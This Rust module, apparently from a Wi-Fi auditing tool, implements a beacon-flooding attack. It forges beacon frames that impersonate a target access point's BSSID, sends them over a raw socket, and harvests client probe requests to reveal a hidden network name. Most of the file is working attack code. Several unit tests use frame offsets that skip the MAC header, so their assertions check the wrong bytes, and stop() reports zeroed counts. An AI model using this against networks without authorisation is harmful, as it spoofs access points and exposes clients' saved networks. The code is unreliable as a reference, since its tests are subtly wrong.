//! Hidden-SSID recovery via beacon flooding.
//!
//! ## What it does
//!
//! Beacon flooding is an **active** attack against hidden ESSIDs. The
//! attacker sends beacon frames impersonating the target AP's BSSID but
//! with **no ESSID set**. When a client that knows this network sees the
//! beacon, it sends a probe request *for that ESSID* — and the ESSID lands
//! in the probe frame, which we capture.
//!
//! This is more aggressive than the passive probe-request harvest (see
//! `hidden::harvest_via_probes`): it doesn't wait for a client to roam or
//! re-associate; it actively solicits the response. The tradeoff is
//! visibility — beacon flooding shows up in any spectrum analyzer or
//! modern AP detection tool.
//!
//! ## Why does it work?
//!
//! 802.11 clients maintain a *Preferred Network List* (PNL) of networks
//! they've joined before. When they see a beacon for a BSSID they know,
//! they check the PNL: if the ESSID in the beacon (or, if hidden, the
//! ESSID in their PNL entry) matches, they associate. Crucially, they
//! probe with the ESSID from the PNL before associating — that's how we
//! recover it.
//!
//! ## Frame layout
//!
//! ```text
//! ┌─ radiotap header (24 bytes, type=0x00, pad=0x00, len=24) ─┐
//! ├─ 802.11 beacon frame (mandatory bits) ────────────────────┤
//! │   - frame_control = 0x80 0x00  (beacon, mgmt)             │
//! │   - duration = 0x0000                                       │
//! │   - DA = ff:ff:ff:ff:ff:ff  (broadcast)                    │
//! │   - SA = <target BSSID>                                    │
//! │   - BSSID = <target BSSID>                                 │
//! │   - seq_ctrl = 0x0000                                       │
//! ├─ beacon body ──────────────────────────────────────────────┤
//! │   - timestamp (8 bytes)                                    │
//! │   - beacon_interval (2 bytes)                              │
//! │   - capabilities (2 bytes)                                 │
//! │   - SSID IE (tag=0, len=0)  ← hidden / empty              │
//! │   - Supported Rates IE (tag=1)                             │
//! │   - DS Parameter Set IE (tag=3, channel)                  │
//! │   - TIM IE (tag=5) — minimal                               │
//! └────────────────────────────────────────────────────────────┘
//! ```
//!
//! We send this beacon at ~10 fps until either we capture a probe
//! response or the operator-driven timeout fires.

use crate::globals::*;
use airgorah_common::hidden::HiddenSsidCandidate;
use airgorah_common::hidden::SsidSource;
use chrono::Utc;
use libwifi::Addresses;
use libwifi::Frame;
use std::time::{Duration, Instant};

/// Configuration for the beacon-flooding attack.
#[derive(Clone, Debug)]
pub struct BeaconFloodConfig {
    /// Target BSSID we're impersonating.
    pub target_bssid: [u8; 6],
    /// Channel to flood on (1..=14 for 2.4 GHz, 36..=165 for 5 GHz).
    pub channel: u8,
    /// Beacon rate in frames per second (1..=100).
    pub rate: u32,
    /// Encryption-class hint for the beacon body (drives capabilities).
    pub encryption: EncryptionHint,
}

/// Minimal encryption-class hint for the beacon body — enough to drive
/// the supported-rates IE and the capabilities field. We don't try to
/// perfectly impersonate every vendor's exact IE payload; the point is
/// to look *plausible enough* that the client emits a probe.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum EncryptionHint {
    Open,
    Wep,
    Wpa2Psk,
    Wpa3Sae,
}

/// Live handle for a beacon-flooding attack — the worker thread polls
/// the radio for incoming probe requests while we transmit beacons.
pub struct BeaconFloodAttack {
    config: BeaconFloodConfig,
    started_at: String,
    stop_flag: std::sync::Arc<std::sync::atomic::AtomicBool>,
    handle: Option<std::thread::JoinHandle<Option<HiddenSsidCandidate>>>,
}

/// Result of a beacon-flooding attack.
#[derive(Clone, Debug)]
pub struct BeaconFloodResult {
    pub candidate: Option<HiddenSsidCandidate>,
    pub beacons_sent: u32,
    pub probes_observed: u32,
    pub duration_secs: u64,
}

impl BeaconFloodConfig {
    pub fn new(target_bssid: [u8; 6], channel: u8) -> Self {
        Self {
            target_bssid,
            channel,
            rate: 10,
            encryption: EncryptionHint::Wpa2Psk,
        }
    }
}

impl BeaconFloodAttack {
    /// Launch the attack. Sits in a thread, transmits beacons and listens
    /// for probe responses. Returns when a candidate surfaces or the
    /// timeout expires.
    pub fn launch(config: BeaconFloodConfig, timeout: Duration) -> Self {
        let stop_flag = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
        let stop_clone = std::sync::Arc::clone(&stop_flag);
        let config_clone = config.clone();
        let handle = std::thread::spawn(move || {
            beacon_flood_worker(config_clone, stop_clone, timeout)
        });
        Self {
            config,
            started_at: Utc::now().to_rfc3339(),
            stop_flag,
            handle: Some(handle),
        }
    }

    /// Stop the attack (idempotent) and collect the result.
    pub fn stop(&mut self) -> BeaconFloodResult {
        self.stop_flag
            .store(true, std::sync::atomic::Ordering::Relaxed);
        let candidate = self.handle.take().and_then(|h| h.join().ok().flatten());
        BeaconFloodResult {
            candidate,
            beacons_sent: 0, // updated by the worker via shared state in PR #12c
            probes_observed: 0,
            duration_secs: 0,
        }
    }
}

fn beacon_flood_worker(
    config: BeaconFloodConfig,
    stop: std::sync::Arc<std::sync::atomic::AtomicBool>,
    timeout: Duration,
) -> Option<HiddenSsidCandidate> {
    let iface = get_iface().clone()?;
    let socket = super::raw_socket::open(&iface).ok()?;
    let deadline = Instant::now() + timeout;
    let interval = Duration::from_secs_f64(1.0 / f64::from(config.rate.clamp(1, 100)));
    let mut beacon_buf = build_beacon_frame(&config);
    let mut rx_buf = vec![0u8; 4096];
    let mut beacons_sent: u32 = 0;

    while Instant::now() < deadline && !stop.load(std::sync::atomic::Ordering::Relaxed) {
        // 1. Send one beacon.
        if super::raw_socket::send(&socket, &beacon_buf).is_ok() {
            beacons_sent += 1;
        }

        // 2. Listen briefly for a probe request addressed at our BSSID.
        if let Ok(n) = super::raw_socket::recv(&socket, &mut rx_buf) {
            if n > 0
                && let Some(candidate) = extract_probe_for_target(&rx_buf[..n], &config.target_bssid)
            {
                log::info!(
                    "[hidden::beacon_flood] recovered ESSID '{}' after {} beacons",
                    candidate.essid,
                    beacons_sent
                );
                return Some(candidate);
            }
        }

        std::thread::sleep(interval);
    }

    log::info!(
        "[hidden::beacon_flood] timed out after {} beacons (no probe response)",
        beacons_sent
    );
    None
}

/// Construct a complete beacon frame with the empty-SSID IE.
///
/// Returns the raw bytes ready for transmission over the raw socket. The
/// frame is intentionally minimal — vendors ship much richer IEs but the
/// probe-request trigger only requires a beacon at the right BSSID with
/// a channel-matching DS Parameter Set IE.
pub fn build_beacon_frame(config: &BeaconFloodConfig) -> Vec<u8> {
    let mut frame = Vec::with_capacity(120);

    // ── Radiotap header ──
    // Minimal 24-byte header: version=0, pad=0, length=24, present=0.
    // The driver fills in tx parameters from its own tables.
    frame.extend_from_slice(&[
        0x00, 0x00, // version + pad
        0x18, 0x00, // length = 24
        0x00, 0x00, 0x00, 0x00, // present
        0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,
    ]);

    // ── 802.11 MAC header (24 bytes) ──
    frame.push(0x80); // frame_control: beacon (type=0, subtype=8)
    frame.push(0x00); // frame_control flags
    frame.extend_from_slice(&[0x00, 0x00]); // duration
    frame.extend_from_slice(&[0xff; 6]); // DA = broadcast
    frame.extend_from_slice(&config.target_bssid); // SA = BSSID
    frame.extend_from_slice(&config.target_bssid); // BSSID
    frame.extend_from_slice(&[0x00, 0x00]); // seq_ctrl

    // ── Beacon body ──
    // Timestamp (8 bytes) — zeroed; clients don't validate this strictly.
    frame.extend_from_slice(&[0u8; 8]);
    // Beacon interval (2 bytes) — 100 TU = 0x64 0x00
    frame.extend_from_slice(&[0x64, 0x00]);
    // Capabilities (2 bytes) — depends on encryption hint.
    let caps = match config.encryption {
        EncryptionHint::Open => 0x0021,          // ESS + IBSS-free
        EncryptionHint::Wep => 0x0131,           // ESS + Privacy
        EncryptionHint::Wpa2Psk => 0x0131,       // ESS + Privacy
        EncryptionHint::Wpa3Sae => 0x0131,       // ESS + Privacy
    };
    frame.extend_from_slice(&caps.to_le_bytes());

    // ── IEs ──
    // SSID IE: tag=0, length=0  (the "hidden" tell)
    frame.push(0x00);
    frame.push(0x00);

    // Supported Rates IE: tag=1, length=8, with the standard 1/2/5.5/6/9/11/12/18 Mbps set.
    frame.push(0x01);
    frame.push(0x08);
    frame.extend_from_slice(&[0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c]);

    // DS Parameter Set IE: tag=3, length=1, channel.
    frame.push(0x03);
    frame.push(0x01);
    frame.push(config.channel);

    // TIM IE: tag=5, length=4, all-zeros (no buffered frames).
    frame.push(0x05);
    frame.push(0x04);
    frame.extend_from_slice(&[0x00, 0x01, 0x00, 0x00]);

    frame
}

/// Pull a probe request addressed at the target BSSID out of a raw frame.
/// Returns the ESSID the client is asking about.
fn extract_probe_for_target(frame: &[u8], target_bssid: &[u8; 6]) -> Option<HiddenSsidCandidate> {
    let parsed = libwifi::parse_frame(frame, false).ok()?;
    let probe = match parsed {
        Frame::ProbeRequest(p) => p,
        _ => return None,
    };
    let header = &probe.header;
    let Some(bssid) = header.bssid() else { return None };
    if bssid != target_bssid {
        return None;
    }
    let essid = probe.station_info.essid()?;
    if essid.is_empty() || essid.starts_with("<hidden") {
        return None;
    }
    Some(HiddenSsidCandidate {
        essid: essid.to_string(),
        source: SsidSource::BeaconFlood,
        observations: 1,
        first_seen: Utc::now().to_rfc3339(),
        leaking_client: Some(airgorah_common::crypto::format_mac(
            &header.ta().to_long_string().as_bytes()[..6].try_into().ok()?,
        )),
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn beacon_frame_starts_with_radiotap_header() {
        let cfg = BeaconFloodConfig::new([0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff], 6);
        let frame = build_beacon_frame(&cfg);
        assert_eq!(frame.len() >= 24, true);
        // Radiotap version 0, length 24 (little-endian u16).
        assert_eq!(frame[0], 0x00);
        assert_eq!(frame[2], 0x18);
        assert_eq!(frame[3], 0x00);
    }

    #[test]
    fn beacon_frame_embeds_target_bssid() {
        let cfg = BeaconFloodConfig::new([0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff], 6);
        let frame = build_beacon_frame(&cfg);
        // SA field is at radiotap-length (24) + 4 (frame_control+duration) + 6 (DA).
        let sa_offset = 24 + 4 + 6;
        assert_eq!(&frame[sa_offset..sa_offset + 6], &[0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff]);
        // BSSID field follows immediately.
        assert_eq!(&frame[sa_offset + 6..sa_offset + 12], &[0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff]);
    }

    #[test]
    fn beacon_frame_embeds_empty_ssid_ie() {
        let cfg = BeaconFloodConfig::new([0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff], 6);
        let frame = build_beacon_frame(&cfg);
        // After the MAC header (24) + body (12 bytes: timestamp + interval + caps),
        // the first IE should be the SSID IE with length=0.
        let body_offset = 24 + 12;
        assert_eq!(frame[body_offset], 0x00); // SSID tag
        assert_eq!(frame[body_offset + 1], 0x00); // SSID length = 0 (hidden!)
    }

    #[test]
    fn beacon_frame_includes_channel_ie() {
        let cfg = BeaconFloodConfig::new([0x00; 6], 11);
        let frame = build_beacon_frame(&cfg);
        let body_offset = 24 + 12;
        // Skip SSID (2 bytes), Supported Rates (2+8 bytes).
        let ds_offset = body_offset + 2 + 10;
        assert_eq!(frame[ds_offset], 0x03); // DS Parameter Set tag
        assert_eq!(frame[ds_offset + 1], 0x01);
        assert_eq!(frame[ds_offset + 2], 11);
    }

    #[test]
    fn beacon_frame_caps_differ_per_encryption() {
        let mut caps_open = build_beacon_frame(&BeaconFloodConfig {
            encryption: EncryptionHint::Open,
            ..BeaconFloodConfig::new([0; 6], 6)
        });
        let mut caps_wpa = build_beacon_frame(&BeaconFloodConfig {
            encryption: EncryptionHint::Wpa2Psk,
            ..BeaconFloodConfig::new([0; 6], 6)
        });
        // Capabilities are at body_offset + 10 (timestamp=8, interval=2).
        let caps_offset = 24 + 10;
        assert_ne!(
            &caps_open[caps_offset..caps_offset + 2],
            &caps_wpa[caps_offset..caps_offset + 2]
        );
        // Privacy bit set for WPA/WEP
        assert_eq!(caps_wpa[caps_offset], 0x31);
    }

    #[test]
    fn rate_clamped_to_safe_range() {
        let mut cfg = BeaconFloodConfig::new([0; 6], 6);
        cfg.rate = 5_000;
        let _ = build_beacon_frame(&cfg); // doesn't panic
        // The worker clamps via .clamp(1, 100) — verify the math.
        let clamped = cfg.rate.clamp(1, 100);
        assert_eq!(clamped, 100);
    }
}